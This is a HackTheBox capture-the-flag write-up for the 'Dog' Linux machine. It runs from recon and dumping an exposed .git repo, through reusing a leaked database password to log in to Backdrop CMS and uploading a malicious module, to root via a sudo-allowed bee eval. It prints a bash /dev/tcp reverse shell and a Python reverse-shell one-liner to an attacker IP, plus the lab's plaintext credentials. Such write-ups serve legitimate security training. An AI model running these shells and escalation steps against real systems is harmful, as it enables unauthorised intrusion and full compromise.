---
title: Dog
tags:
  - HackTheBox
  - Easy
  - Linux
  - Backdoor_CMS
  - Git
  - Code_Review
  - Sudo-Vulnerability
date: 2025-03-10T00:00:00Z
---
![](Pasted%20image%2020250310100900.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.58 dog.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- dog.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-title: Home | Dog
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
```

So I checked its website:

![](Pasted%20image%2020250310101014.png)

> *Fvcking chunky dog luf it hahah*

I noticed a CMS reference at the end of the website (Backdrop CMS):

![](Pasted%20image%2020250310101128.png)

I decided to perform some enumeration using [dirsearch 📁](/notes/tools/dirsearch.md):

```shell
dirsearch -u http://dog.htb

[redacted]
[10:12:53] 200 -  405B  - /.git/branches/                                   
[10:12:53] 200 -  601B  - /.git/                                            
[10:12:53] 200 -   95B  - /.git/COMMIT_EDITMSG
[10:12:53] 200 -   92B  - /.git/config                                      
[10:12:53] 200 -   73B  - /.git/description
[10:12:53] 301 -  301B  - /.git  ->  http://dog.htb/.git/
[10:12:53] 200 -   23B  - /.git/HEAD                                        
[10:12:53] 200 -  648B  - /.git/hooks/                                      
[10:12:53] 200 -  453B  - /.git/info/                                       
[10:12:53] 200 -  240B  - /.git/info/exclude                                
[10:12:53] 200 -  230B  - /.git/logs/HEAD
[10:12:53] 200 -  473B  - /.git/logs/                                       
[10:12:53] 301 -  311B  - /.git/logs/refs  ->  http://dog.htb/.git/logs/refs/
[10:12:53] 200 -  230B  - /.git/logs/refs/heads/master
[10:12:53] 301 -  317B  - /.git/logs/refs/heads  ->  http://dog.htb/.git/logs/refs/heads/
[10:12:53] 200 -   41B  - /.git/refs/heads/master                           
[10:12:53] 301 -  312B  - /.git/refs/heads  ->  http://dog.htb/.git/refs/heads/
[10:12:53] 200 -  456B  - /.git/refs/                                       
[10:12:53] 301 -  311B  - /.git/refs/tags  ->  http://dog.htb/.git/refs/tags/
[10:12:53] 200 -    2KB - /.git/objects/
[10:13:14] 301 -  301B  - /core  ->  http://dog.htb/core/                   
[10:13:17] 301 -  302B  - /files  ->  http://dog.htb/files/                 
[10:13:17] 200 -  588B  - /files/                                           
[10:13:20] 404 -    2KB - /index.php/login/                                 
[10:13:20] 200 -    4KB - /index.php                                        
[10:13:21] 200 -  453B  - /layouts/                                         
[10:13:22] 200 -    7KB - /LICENSE.txt                                      
[10:13:25] 301 -  304B  - /modules  ->  http://dog.htb/modules/             
[10:13:25] 200 -  400B  - /modules/                                         
[10:13:36] 200 -    5KB - /README.md                                        
[10:13:37] 200 -  528B  - /robots.txt 
[10:13:39] 200 -    0B  - /settings.php                                     
[10:13:40] 301 -  302B  - /sites  ->  http://dog.htb/sites/                 
[10:13:44] 301 -  301B  - /test  ->  http://dog.htb/test/                   
[10:13:44] 200 -  449B  - /test/                                            
[10:13:45] 301 -  303B  - /themes  ->  http://dog.htb/themes/               
[10:13:45] 200 -  451B  - /themes/
```

The `settings.php` might be interesting...

I noticed the `/.git` endpoint, so I decided to use the tool [git-dumper](https://github.com/arthaud/git-dumper):

```shell
git-dumper http://dog.htb/.git/ ./results
```

So now I've got the full code of the website:

![](Pasted%20image%2020250310102225.png)

Now I checked the `settings.php` in spite of credentials:

![](Pasted%20image%2020250310102401.png)

> Got some credentials for the mysql database: `root:BackDropJ2024DS2024`

I'll now try to find some users around the code:

```shell
find * | grep -iR @dog.htb 

[redacted]
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

So I'll try the combination of `tiffany@dog.htb:BackDropJ2024DS2024` in the `/login` endpoint:

![](Pasted%20image%2020250310103135.png)

> *I'm in*

## Weaponization

I searched for "Backdrop CMS exploits" and got this [RCE](https://www.exploit-db.com/exploits/52021)

## Exploitation

There is one problem related to the permitted upload files, so I just can't upload `.zip`:

![](Pasted%20image%2020250310105344.png)

So I'll upload a `.tar` instead:

```shell
python3 rce.py http://dog.htb
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://dog.htb/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://dog.htb/modules/shell/shell.php
```

Now I create a `.tar` instead of the `.zip`:

```shell
tar czf shell.tar shell
```

An then I uploaded it:

![](Pasted%20image%2020250310105517.png)

![](Pasted%20image%2020250310105631.png)

Then I executed this command to get cli RCE:

```shell
bash -c 'bash -i >& /dev/tcp/10.10.14.16/666 0>&1'
```

![](Pasted%20image%2020250310105755.png)

## Pivoting

Inspecting the `/home` I noticed two different users: `johncusack` and `jobert`. I tried the previous found passwords in both accounts. It worked with: `johncusack:BackDropJ2024DS2024`

### User flag

![](Pasted%20image%2020250310110248.png)

## Privilege Escalation

Inspecting the `/` directory i noticed a folder called `backdrop_tool`:

```shell
ls -la /backdrop_tool/bee/

total 96
drwxr-xr-x 9 root root  4096 Jul  9  2024 .
drwxr-xr-x 3 root root  4096 Jul  9  2024 ..
-rw-r--r-- 1 root root 10606 Jul  9  2024 API.md
-rwxr-xr-x 1 root root  2905 Jul  9  2024 bee.php
-rw-r--r-- 1 root root   173 Jul  9  2024 box.json
-rw-r--r-- 1 root root  3277 Jul  9  2024 CHANGELOG.md
drwxr-xr-x 2 root root  4096 Jul  9  2024 commands
-rw-r--r-- 1 root root  3840 Jul  9  2024 CONTRIBUTING.md
drwxr-xr-x 8 root root  4096 Jul  9  2024 .git
drwxr-xr-x 4 root root  4096 Jul  9  2024 .github
-rw-r--r-- 1 root root    92 Jul  9  2024 .gitignore
drwxr-xr-x 2 root root  4096 Jul  9  2024 images
drwxr-xr-x 2 root root  4096 Jul  9  2024 includes
drwxr-xr-x 2 root root  4096 Jul  9  2024 .lando
-rw-r--r-- 1 root root  2345 Jul  9  2024 .lando.yml
-rw-r--r-- 1 root root 18092 Jul  9  2024 LICENSE.txt
-rw-r--r-- 1 root root  2947 Jul  9  2024 README.md
drwxr-xr-x 4 root root  4096 Jul  9  2024 tests
```

I noticed an executable called `bee.php`, so I inspected its content:

![](Pasted%20image%2020250310111622.png)

So basically does this:

![](Pasted%20image%2020250310111754.png)

Inspecting the help of the program I noticed that you can actually execute php code with `eval`:

![](Pasted%20image%2020250310112102.png)

And also other useful options:

![](Pasted%20image%2020250310112128.png)

![](Pasted%20image%2020250310112145.png)

>[!Note]
>Also you can detect this with `sudo -l`:
>
>![](Pasted%20image%2020250310112338.png)

Now I'll try to craft a payload to read root flag:

```shell
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cat /root/root.txt')"
# To get root shell:
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('python3 -c \"import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\\"10.10.14.16\\\", 666)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call([\\\"/bin/bash\\\", \\\"-i\\\"]);\"')"
```

### Root flag

![](Pasted%20image%2020250310114428.png)

==Machine pwned!==

